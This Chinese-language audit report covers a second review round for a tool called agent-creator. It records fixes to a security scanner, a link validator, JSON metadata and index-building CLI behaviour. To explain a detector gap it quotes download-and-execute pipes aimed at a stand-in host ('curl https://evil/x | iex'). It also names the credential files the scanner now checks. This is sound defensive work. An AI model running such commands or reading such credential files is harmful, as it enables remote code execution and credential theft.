# 审计闭环：第二轮独立复核（修复是否生效 + 安全绕过 + 契约/文档一致性）

## 基本信息
- 日期：2026-09-10
- 版本：agent-creator 0.7.1 → 0.7.2
- 触发来源：对 0.7.1（第一轮刚大改）换角度独立复核——重点验证上一轮修复**是否真的生效**，并覆盖「已提交产物数据契约」「安全扫描绕过」「文档承诺 ≠ 行为」「CLI 语义」，逐条实证复现后修复

## 复核结论：上一轮修复的生效性

用 grep + 运行期探针逐项验证第一轮 21 项，**未发现「修了但没生效」的项**：
- `utf-8-sig` 覆盖全部读写入口（validate / compare / build / adapt / create）；BOM 代理 `--strict` 全绿、adapt opencode 正常转换。
- `indexes/upstream.db`（已提交产物）**无块标量损坏**：`description in ('>','|',…)` 计数 0、`null-name`/`null-path` 0、FTS 行数 = 主表 568；`--stats` 3 源 568 条稳定。
- `compare_agents --json` 为纯 JSON、缺文件/非 dict 干净报错；验证器默认 `--dir` 不误报、显式空目录 fail-loud；fenced 链接/反引号豁免生效。
- `--from-extracted` 前置校验、`--keep` 纳入清理条件均生效。

## 本轮新发现并修复（5 项）

1. **危险管道 PowerShell 别名绕过（中，安全）**：`curl`/`wget` 在 PowerShell 是 `Invoke-WebRequest` 的别名，但 curl/wget 管道的右侧 shell 名单不含 `iex`/`invoke-expression` → `curl https://evil/x | iex`、`wget … | Invoke-Expression` 全部漏检（`irm/iwr … | iex` 才被检出）。复现：三条均 `find_dangerous_pipes == []`。修复：把 `iex`/`invoke-expression` 并入 curl/wget 链的 shell 集合；`grep iex` 仍不误报。
2. **凭据 dotfile 漏扫（中，覆盖缺口）**：`is_scannable_text` 仅特判 `.env`/`.env.*`，`id_rsa`/`id_ed25519`/`.npmrc`/`.git-credentials`/`.netrc` 等无扩展名凭据文件被跳过——而 `SECRET_PATTERNS` 已含 PEM 私钥头。修复：新增 `SENSITIVE_DOTFILES` 精确名单并入扫描；捆绑的 `id_rsa`（PEM 头）现可检出。
3. **带标题的 Markdown 链接误报悬空（中，正确性）**：`[x](guide.md "标题")` 的链接标题被当成路径的一部分 → 即便 `guide.md` 存在也报 `Dangling link`。复现：`guide.md "The Guide"` 被判悬空。修复：解析前剥离 CommonMark 可选标题（`"…"` / `'…'` / `(…)`）；缺失文件的带标题链接仍报错。
4. **`compare_agents --json` 数据契约错误（低）**：`meta.comparison_dimensions` 仍写 `"quality6+structure4"`，与实算 7 个质量维度及同轮已统一的文档矛盾。修复为 `"quality7+structure4"`。
5. **`quality-bar` 检查项计数漂移（低，文档≠行为）**：`agent-quality-bar.md` 仍称「6 项质量检查」、README 目录树写「6 项」，而对比模型与安全护栏已是第 7 维。修复：质量门槛统一为 **7 项**并补第 7 项安全护栏（与 `agent-comparison.md` 对应）。
6. **`build_agent_index` CLI 语义与产物保护（低，数据契约）**：
   - `--no-dl` 未强制单一 `--source`：默认 `--source all` 时会对同一个 cwd 依次按 3 源布局重复扫描（agency/agency-zh 直接重复），产出重复索引。修复：与 `--from-extracted` 一致，`--no-dl` 必须搭配单一 `--source`（help/`agent-index.md` 同步）。
   - 某源 0 命中时原实现 `continue` 后仍写库 → 会用「少一个源」的部分索引覆盖已提交 DB。修复：任一选定源 0 命中即中止、**不写库**（fail-loud）。
   - 下载/解包失败原会抛未捕获异常回溯；改为清晰报错退出 1（不写库）。

## 采纳要点（改了什么）

- `scripts/security_scan.py`：curl/wget 管道 shell 集合增 `iex`/`invoke-expression`；新增 `SENSITIVE_DOTFILES` 并接入 `is_scannable_text`。
- `scripts/validate_agents.py`：dangling-link 检查剥离可选链接标题。
- `scripts/compare_agents.py`：`--json` meta 维度串改 `quality7+structure4`。
- `scripts/build_agent_index.py`：`--no-dl` 单源约束、0 命中/下载失败 fail-loud 且不覆盖索引；help/docstring。
- 文档：`references/agent-quality-bar.md`（7 项 + 安全护栏）、`README.md`、`references/agent-index.md`。
- 测试：`tests/test_hardening_round2.py` 新增 **9 例** → agent-creator pytest **44 → 53**。
- 版本 0.7.1 → 0.7.2。

## 验证结果

- `python -m pytest tests/ -q`：**53 passed**（原 44 + 新 9）。
- `validate_agents.py --strict --dir <仓库根>/agents`：Checked 32，全绿。
- `search_agent_index.py --stats`：3 源 568 条，完整性 OK。
- `build_catalog.py --check`：skills / agents 目录均 up to date。

## 学习点

- **「别名」是安全正则的经典盲区**：同类危险动作会有多个等价写法（`curl`/`wget` 在 PowerShell 实为 `Invoke-WebRequest`），按字面二元组穷举必然漏；名单要按「语义等价类」维护。
- **无扩展名文件要靠精确名单兜底**：`splitext` 对 `.env` 与 `id_rsa` 同样失效，扩展名白名单天然扫不到凭据 dotfile。
- **Markdown 语法糖要解析而非当字面量**：链接标题、`#fragment`、`<>` 包路径都是合法语法，正则不做剥离就会把合法文档判成悬空。
- **「修复生效」必须实测**：本轮把第一轮每项都跑了一遍探针，确认无「修了但没生效」；同时确认「机器可读契约里的计数/枚举」与文档同源，避免只改人读文档、漏改 JSON/meta。
